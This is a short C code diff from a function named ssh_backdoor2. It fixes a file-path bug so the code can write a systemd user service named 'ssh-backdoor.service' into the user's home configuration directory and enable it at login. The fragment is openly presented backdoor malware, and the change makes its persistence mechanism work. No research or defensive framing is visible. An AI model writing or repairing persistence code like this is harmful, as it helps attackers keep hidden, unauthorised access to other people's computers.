@@ -318,8 +318,12 @@ void ssh_backdoor2() {
            "[Install]\n"
            "WantedBy=default.target");
 
-  FILE *svc_file =
-      fopen("%s/.config/systemd/user/ssh-backdoor.service", home, "w");
+  char backserv[1024];
+  snprintf(backserv, sizeof(backserv),
+           "%s/.config/systemd/user/ssh-backdoor.service", home);
+
+  FILE *svc_file = fopen(backserv, "w");
+
   if (svc_file) {
     fwrite(systemd_service, 1, strlen(systemd_service), svc_file);
     fclose(svc_file);
